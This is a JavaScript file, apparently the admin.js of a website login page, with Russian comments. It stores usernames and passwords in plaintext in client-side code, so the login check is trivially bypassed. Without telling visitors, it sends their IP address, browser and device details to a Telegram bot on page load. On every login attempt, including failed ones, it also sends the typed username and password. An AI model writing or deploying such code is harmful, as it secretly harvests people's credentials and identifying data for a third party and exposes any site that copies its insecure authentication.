const users = [
    { username: "Lena", password: "1" }
];

const specialUsers = [
    { username: "test", password: "test", redirect: "UgadaiPapku13" }
];

// === Настройки Telegram (ВНИМАНИЕ: небезопасно хранить токен в клиентском JS) ===
const TELEGRAM_BOT_TOKEN = "123456:ABC-DEF"; // 🔹 вставь свой токен
const TELEGRAM_CHAT_ID = "123456789";        // 🔹 вставь свой chat_id

// === Вспомогательная: получить публичный IP через ipify ===
async function getPublicIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json", {cache: "no-store"});
        if (!res.ok) throw new Error("ipify error " + res.status);
        const j = await res.json();
        return j.ip || "unknown";
    } catch (e) {
        console.warn("Не удалось получить публичный IP:", e);
        return "unknown";
    }
}

// === Отправка сообщения в Telegram (fire-and-forget) ===
async function sendLog(message) {
    try {
        // не ждём результата; но вызываем fetch чтобы попытаться отправить
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🧾 [admin.js]\n${message}`,
                disable_notification: true
            })
        }).catch(err => console.error("Ошибка отправки fetch -> Telegram:", err));
    } catch (err) {
        console.error("Ошибка при отправке в Telegram:", err);
    }
}

// === Собрать расширенные данные окружения и отправить лог ===
async function gatherAndSend(baseMessage) {
    const ip = await getPublicIP();
    const ua = navigator.userAgent || "unknown";
    const platform = navigator.platform || "unknown";
    const lang = navigator.language || "unknown";
    const screenRes = (window.screen && window.screen.width) ? `${window.screen.width}x${window.screen.height}` : "unknown";

    const full = [
        baseMessage,
        "",
        "📡 IP: " + ip,
        "🌐 User-Agent: " + ua,
        "💻 Platform: " + platform,
        "🗣 Language: " + lang,
        "🖥 Screen: " + screenRes,
        "⏱ Time: " + new Date().toISOString()
    ].join("\n");

    console.log(full); // локально в консоль
    sendLog(full);     // и в Telegram
}

// === Отчёт при загрузке страницы (с расширенными данными) ===
(async function initialReport() {
    const report = [
        "📊 Отчёт загрузки admin.js",
        "👥 Пользователи: " + JSON.stringify(users),
        "⭐ Особые пользователи: " + JSON.stringify(specialUsers),
        "📁 Файлы: admin/style.css, scripts/admin.js, img/logo.png",
    ].join("\n");

    await gatherAndSend(report);
    console.log("🟢 Скрипт admin.js загружен полностью!");
})();

// === Обработчик логина ===
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    let baseLog = `🔐 Попытка входа:\n👤 ${username}\n🔑 ${password}`;

    const specialUser = specialUsers.find(u => u.username === username && u.password === password);
    const user = users.find(u => u.username === username && u.password === password);

    if (specialUser) {
        baseLog += `\n✅ Найден specialUser → ${specialUser.redirect}`;
        document.getElementById('message').textContent = "Success";
        document.getElementById('message').style.color = "green";

        // отправляем лог (не ждём) и переходим по redirect
        gatherAndSend(baseLog);
        window.location.href = specialUser.redirect;

    } else if (user) {
        baseLog += `\n✅ Найден обычный user`;
        document.getElementById('message').textContent = "Success";
        document.getElementById('message').style.color = "green";

        gatherAndSend(baseLog);
        window.location.href = "UgadaiPapku13";

    } else {
        baseLog += `\n❌ Неверные данные`;
        document.getElementById('message').textContent = "Wrong username or password.";
        document.getElementById('message').style.color = "red";

        gatherAndSend(baseLog);
    }
});
